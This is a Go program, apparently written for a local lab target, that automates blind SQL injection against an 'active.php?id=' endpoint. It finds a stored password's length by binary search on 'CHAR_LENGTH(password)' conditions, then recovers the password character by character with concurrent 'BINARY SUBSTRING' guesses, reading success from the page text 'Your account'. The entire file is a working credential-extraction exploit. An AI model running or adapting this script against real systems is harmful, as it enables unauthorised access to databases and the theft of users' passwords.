package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"unicode/utf8"
)

const serverUrl = "http://localhost:8000/active.php?id="

type guessResponse struct {
	position  int
	value     string
	isSuccess bool
}

const asciiFrom, asciiTo rune = 0, utf8.MaxRune

func main() {
	accountId := 2

	passwordSize := getPasswordLengthForAccount(accountId)

	responseChan := make(chan guessResponse)
	for i := 1; i <= passwordSize; i++ {
		go guessPasswordChar(accountId, i, responseChan)
	}

	password := make([]string, passwordSize)
	responseCount := 0

	println("Start guessing password")

	for {
		guess, _ := <-responseChan
		responseCount++

		if guess.isSuccess {
			password[guess.position-1] = guess.value

			println(fmt.Sprintf("%d/%d char at %d is %s",
				responseCount,
				passwordSize,
				guess.position,
				guess.value),
			)
		} else {
			println(fmt.Sprintf("%d/%d char at %d could not be found",
				responseCount,
				passwordSize,
				guess.position),
			)
		}

		if responseCount == passwordSize {
			break
		}
	}

	println(strings.Join(password, ""))
}

func guessPasswordChar(accountId int, charPosition int, responseChan chan guessResponse) {
	for j := asciiFrom; j < asciiTo; j++ {
		query := fmt.Sprintf(`%d AND BINARY SUBSTRING(password, %d, %d) = "%s"`, accountId, charPosition, 1, string(j))
		res := getResponseBody(query)
		if doesResponseContainAccount(res) {
			responseChan <- guessResponse{
				position:  charPosition,
				value:     string(j),
				isSuccess: true,
			}
			return
		}
	}

	responseChan <- guessResponse{position: charPosition, isSuccess: false}
}

func getPasswordLengthForAccount(accountId int) int {
	return getPasswordLengthForAccountBetween(accountId, 0, 100)
}

func getPasswordLengthForAccountBetween(accountId int, min int, max int) int {
	println(fmt.Sprint("Get password length account ", accountId, " min:", min, " max:", max))
	baseQuery := fmt.Sprint(accountId, " AND CHAR_LENGTH(password)")

	if max-min < 4 {
		query := fmt.Sprint(baseQuery, " = ", min)
		if isQueryMatching(query) {
			return min
		}

		return getPasswordLengthForAccountBetween(accountId, min+1, max)
	}

	query := fmt.Sprint(baseQuery, " < ", (min+max)/2)

	if isQueryMatching(query) {
		return getPasswordLengthForAccountBetween(accountId, min, (min+max)/2)
	} else {
		return getPasswordLengthForAccountBetween(accountId, (min+max)/2-1, max)
	}
}

func isQueryMatching(queryString string) bool {
	return doesResponseContainAccount(getResponseBody(queryString))
}

func doesResponseContainAccount(response string) bool {
	return strings.Contains(response, "Your account")
}

func getResponseBody(queryString string) string {
	res, err := http.Get(fmt.Sprint(serverUrl, url.QueryEscape(queryString)))

	if err != nil {
		panic(err)
	}
	defer res.Body.Close()

	bodyBytes, err := ioutil.ReadAll(res.Body)
	if err != nil {
		panic(err)
	}

	return string(bodyBytes)
}
